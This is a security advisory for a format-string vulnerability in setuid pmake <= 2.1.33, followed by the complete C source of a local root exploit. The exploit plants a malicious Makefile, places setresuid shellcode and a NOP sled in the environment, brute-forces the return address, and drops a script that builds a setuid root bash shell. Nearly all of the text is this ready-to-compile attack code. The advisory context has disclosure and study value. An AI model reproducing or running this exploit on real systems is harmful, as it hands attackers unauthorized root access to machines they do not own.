source: http://www.securityfocus.com/bid/3572/info

Parallel Make (pmake) is a freely available version of the make program, originally distributed with Berkeley Unix. It is designed to execute Makefiles and build programs.

pmake is not typically setuid root, although some Linux distributions default to installing it this way. When a Makefile is executed by pmake, certain user-defined variables can be set in the Makefile by the user. One such variable is the shell definition variable, or .SHELL. By supplying a format string in the check= field of the .SHELL variable, it is possible to write to an arbitrary memory address of the program. This could result in the overwriting of the return address, and execution of arbitrary code with root privileges. 

/****************************************************************
*																*
*		Pmake <= 2.1.33 local root exploit						*
*		coded by IhaQueR@IRCnet									*
*		compile with gcc -pmexpl-c -o pm						*
*		meet me at HAL '2001									*
*																*
****************************************************************/





#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>



//	some definitions
#define TARGET "/usr/bin/pmake"
#define MKFILE "Makefile"
#define MKMSH "./mkmsh"
#define TMPLEN 256
#define USERSTACK 0xc0000000u
#define NN "\E[m"
#define GR "\E[32m"
#define RD "\E[31m"
#define BL "\E[34m"
#define BD "\E[1m"
#define FL "\E[5m"
#define UL "\E[4m"


extern char **environ;

static const char *banner = "\n"
							BL"*****************************************\n"
							"*\t\t\t\t\t*\n"
							"*\tpmake local root exploit\t*\n"
							"*\tby "FL"IhaQueR@IRCnet"NN BL" '2001\t\t*\n"
							"*\t\t\t\t\t*\n"
							"*****************************************\n"
							"\n"NN;

static const char *usage =	"\n"
							UL"USAGE:"NN " %s\t-w <wlen delta, try -32,...,32>\n"
							"\t\t-s <shell addr>\n"
							"\t\t-a <ret addr  0xbfff73c0 for orig SuSE 7.1 and pmake
2.1.33>\n"
							"\t\t-m <attempts>\n"
							"\t\t-p <%%g preload>\n"
							"\n";

static const char *mkfile = "all:\n\t-echo blah\n\n.SHELL : path=/bin/sh
echo=\"\" quiet=\"\" hasErrCtl=no check=";

//	setresuid(0,0,0) shellcode
static char hellcode[]= "\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
						"\xb0\xa4\xcd\x80"
						"\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
						"\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
						"\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff./mkmsh";

//	our suid shell maker
static char mkmsh[] =	"#!/bin/bash\n"
						"cat <<__DUPA__>sush.c\n"
						"#include <stdio.h>\n"
						"#include <unistd.h>\n"
						"main() {setuid(geteuid()); execl(\"/bin/bash\", \"/bin/bash\",
NULL);}\n"
						"__DUPA__\n"
						"gcc sush.c -o sush >/dev/null 2>&1\n"
						"chown 0.0 sush\n"
						"chmod u+s sush\n";

static char *fromenv[] = {	"TERM",
							"HOME",
							"PATH"
						};

#define numenv (sizeof(fromenv)/sizeof(char*)+2)

static char *myenv[numenv];
static char eb[numenv][TMPLEN];

int cn=0;


void child_kill(int v)
{
		cn--;
}


int do_fork()
{
		cn++;
		return fork();
}


int main(int ac, char** av)
{
int pd[2], fd, mk, i, j, res, pid, cnt, flip, mx, wdel;
unsigned *up, pad, wlen, shadr, wadr, len1, old, idx, gprel;
unsigned char *ptr;
char buf[16384];
char buf2[16384];
char aaaa[1024*32];
char head[64];
struct stat sb;
fd_set rs;


//	setup defaults
//	shell address is calculated from user stack location and the big nop
buffer...should work :-/
		shadr = USERSTACK - sizeof(aaaa)/2;
		wadr = 0xbfff73b0;
		mx = 512;
		gprel=150;
		wdel=0;

		setpgrp();
		setsid();

		printf(banner);

//	parse options
		if(ac!=1) {
			res = getopt(ac, av, "hw:s:a:m:p:");
			while(res!=-1) {
				switch(res) {
				case 'w' :
					wdel = atoi(optarg);
					break;

				case 's' :
					sscanf(optarg, "%x", &shadr);
					break;

				case 'a' :
					sscanf(optarg, "%x", &wadr);
					break;

				case 'm' :
					sscanf(optarg, "%d", &mx);
					break;

				case 'p' :
					sscanf(optarg, "%d", &gprel);
					if(gprel==0)
						gprel=1;
					break;

				case 'h' :
				default :
					printf(usage, av[0]);
					exit(0);
					break;
				}
				res = getopt(ac, av, "hw:s:a:m:p:");
			}
		}


//	phase 1 : setup
		printf("\n\n"BD BL"* PHASE 1\n"NN);

//	prepare environ
		printf("\n\tpreparing new environment");
		memset(aaaa, 'A', sizeof(aaaa));
		aaaa[4]='=';
		up=(unsigned*)(aaaa+5);
		for(i=0; i<sizeof(aaaa)/sizeof(int)-2; i++)
			up[i]=0x41424344;
		aaaa[sizeof(aaaa)-1]=0;
		len1=strlen(aaaa);

//	buffer overflow :-)
		myenv[0]=aaaa;
		for(i=1; i<numenv-1; i++) {
			myenv[i]=eb[i-1];
			strcpy(eb[i-1], fromenv[i-1]);
			if(!strchr(fromenv[i-1], '=')) {
				strcat(eb[i-1], "=");
				strcat(eb[i-1], getenv(fromenv[i-1]));
			}
		}
		myenv[numenv-1]=NULL;

//	clean
		printf("\n\tcleaning");
		unlink("LOCK.make");
		unlink("sush");
		unlink("sush.c");
		unlink("mkmsh");
		system("rm -rf /tmp/make* >/dev/null 2>&1");

//	our suid shell
		printf("\n\tpreparing shell script");
		mk = open(MKMSH, O_WRONLY|O_CREAT|O_TRUNC, S_IRWXU|S_IXGRP|S_IXOTH);
		if(mk<0)
			perror("open"), exit(1);
		write(mk, mkmsh, strlen(mkmsh));
		close(mk);

//	comm pipe
		printf("\n\tallocating pipe");
		res = pipe(pd);
		if(res<0)
			perror("pipe"), exit(2);

//	redirect stdin/out
		printf("\n\tstdout/in preparation");
		res = dup2(pd[1], 2);
		if(res<0)
			perror("dup2"), exit(3);

		fd = open("/dev/null", O_RDWR);
		if(fd<0)
			perror("open"), exit(4);

//	our makefile
		printf("\n\tgenerating Makefile");
		mk = open(MKFILE, O_WRONLY|O_CREAT|O_TRUNC, S_IRWXU);
		if(mk<0)
			perror("open"), exit(5);
		write(mk, mkfile, strlen(mkfile));
		for(i=0; i<gprel; i++)
			write(mk, "%g", 2);
		fsync(mk);

//	child killer
		printf("\n\tfinished setup");
		if(signal(SIGCHLD, &child_kill)==SIG_ERR)
			perror("signal"), exit(6);


//	phase 2 : dig format string
		printf("\n\n\n" BD BL "* PHASE 2\n"NN);
		printf("\n\tdigging magic string:\t");

		cnt=0;
		while(1) {

			lseek(mk, -2, SEEK_CUR);
			write(mk, "%g%x", 4);
			fsync(mk);
			usleep(1);

			pid = do_fork();

//	get child output
			if(pid) {
				printf("%4d ", cnt);
				fflush(stdout);

				do {
					bzero(buf, sizeof(buf));
					res = read(pd[0], buf, sizeof(buf)-1);
					if(res > 128) {
						break;
					}
				} while(1);
				kill(SIGTERM, pid);
				usleep(1);
				waitpid(pid, NULL, WUNTRACED);
				bzero(buf2, sizeof(buf2));
				read(pd[0], buf2, sizeof(buf2)-1);
				if(waitpid(pid, NULL, WUNTRACED|WNOHANG)>0)
					read(pd[0], buf2, sizeof(buf2)-1);

//	look for padding
				pad=-1;
				if(strstr(buf, "41424344")) {
					pad=0;
				}
				else if(strstr(buf, "42434441")) {
					pad=1;
				}
				else if(strstr(buf, "43444142")) {
					pad=2;
				}
				else if(strstr(buf, "44414243")) {
					pad=3;
				}

//	if got the mark parse output for final string
				if(pad!=-1) {
					printf("\n\tfound mark, parsing output");
					ptr = strtok(buf, "\t\n ");
					while(ptr) {
						if(strlen(ptr)>64)
							break;
						ptr = strtok(NULL, "\t\n ");
					}

//	calculate write length -6, -8 hm I'm dunno about the 16?
					wlen=strlen(ptr)+wdel-16;
					printf("\n\tFOUND magic string with pading=%d  output length=%d",
pad, wlen);


//	PHASE 3 : find write pos in aaaa
					printf("\n\n\n" BD BL "* PHASE 3\n"NN);

					printf("\n\tlooking for write position: ");

					up=(unsigned*)(aaaa+5-pad);
					cnt=0;

					for(i=1; i<sizeof(aaaa)/sizeof(int)-1; i++) {
						old=up[i];
						up[i]=0xabcdef67;
						printf("%4d ", i);
						sprintf(head, "%x", up[i]);
						fflush(stdout);

						if(cn)
							read(pd[0], buf2, sizeof(buf2)-1);
						pid = do_fork();
						if(pid) {
							do {
								bzero(buf, sizeof(buf));
								FD_ZERO(&rs);
								FD_SET(pd[0], &rs);
								select(pd[0]+1, &rs, NULL, NULL, NULL);
								res = read(pd[0], buf, sizeof(buf)-1);
								if(res > 128) {
									break;
								}
							} while(1);
							kill(SIGTERM, pid);
							usleep(1);
							read(pd[0], buf2, sizeof(buf2)-1);

//	up[i] is now the place for the beginning of our address field
							if(strstr(buf, head)) {
								printf(" * FOUND *");
								fflush(stdout);
								up[i]=old;
								idx=i;
								printf("\n\tFOUND write position at index=%d", i);
								up[i]=old;
								ptr = strtok(buf, "\t\n ");
								while(ptr) {
									if(strlen(ptr)>64)
										break;
									ptr = strtok(NULL, "\t\n ");
								}

//	construct write 'head':
								printf("\n\tcreating final makefile");
								fflush(stdout);
								lseek(mk, -2, SEEK_CUR);

								ptr = (unsigned char*)&shadr;
								for(j=0; j<4; j++) {
									flip = (((int)256) + ((int)ptr[j])) - ((int)(wlen % 256u));
									wlen = wlen + flip;
									sprintf(head+j*8, "%%%04dx%%n", flip);
								}
								head[32] = 0;
								write(mk, head, strlen(head));

//	brute force RET on the stack upon success
								printf("\n\tcreating shell in the environment");

//	create env shell
								ptr = (unsigned char*)&(up[i+2*10]);
								while(ptr<(unsigned char*)(aaaa+sizeof(aaaa)-4)) {
									*ptr=0x90;
									ptr++;
								}

								strncpy(aaaa+sizeof(aaaa)-strlen(hellcode)-1, hellcode,
strlen(hellcode));
								aaaa[sizeof(aaaa)-1]=0;
								if(len1!=strlen(aaaa)) {
									printf(BD RD"\nERROR: len changed!\n"NN);
									exit(7);
								}

//	phase 4: brute force
								printf("\n\n\n"BD BL"* PHASE 4\n"NN);
								printf("\n\tbrute force RET:\t");
								fflush(stdout);
								cnt=0;

								while(cnt<mx) {

									for(j=0; j<4; j++) {
										up[idx+2*j] = wadr + j%4;
										up[idx+2*j+1] = wadr + j%4;
									}

									pid = do_fork();
									if(pid) {
										printf(" 0x%.8x", wadr);
										fflush(stdout);
										waitpid(pid, NULL, WUNTRACED);
										res = stat("sush", &sb);
										if(!res && sb.st_uid==0) {
											printf(BD GR"\n\nParadox, created suid shell at
%s/sush\n\n"NN, getcwd(buf, sizeof(buf)-1));
											system("rm -rf /tmp/make* >/dev/null 2>&1");
											exit(0);
										}
									}
									else {
										res = dup2(fd, 1);
										if(res<0)
											perror("dup2"), exit(8);
										res = dup2(fd, 2);
										if(res<0)
											perror("dup2"), exit(9);

										execle(TARGET, TARGET, "-X", "-dj", NULL, myenv);
										_exit(10);
									}
									if(cnt%8==7)
										printf("\n\t\t\t\t");
									cnt++;
									wadr += 4;
								}
//	failure
								printf(BD RD"\nFAILED :-("NN);
								system("rm -rf /tmp/make* >/dev/null 2>&1");
								exit(11);
							}
						}
						else {
							res = dup2(fd, 1);
							if(res<0)
								perror("dup2"), exit(12);
							execle(TARGET, TARGET, "-X", "-dj", NULL, myenv);
							exit(13);
						}
						up[i]=old;
						waitpid(pid, NULL, WUNTRACED);
					}

					printf(BD RD"\n\tstrange error, write pos not found!\n"NN);
					system("rm -rf /tmp/make* >/dev/null 2>&1");
					exit(14);

					ptr = strtok(buf, "\n");
					while(ptr) {
						printf("\nLINE [%s]", ptr);
						ptr = strtok(NULL, "\n");
					}

					exit(15);
				}

//	start target and read output
			}
			else {
				res = dup2(fd, 1);
				if(res<0)
					perror("dup2"), exit(16);
				execle(TARGET, TARGET, "-X", "-dj", NULL, myenv);
				exit(17);
			}

			if(cnt%8==7)
				printf("\n\t\t\t\t");
			cnt++;
		}

		printf(BD RD"\nFAILED\n"NN);
		system("rm -rf /tmp/make* >/dev/null 2>&1");

return 0;
}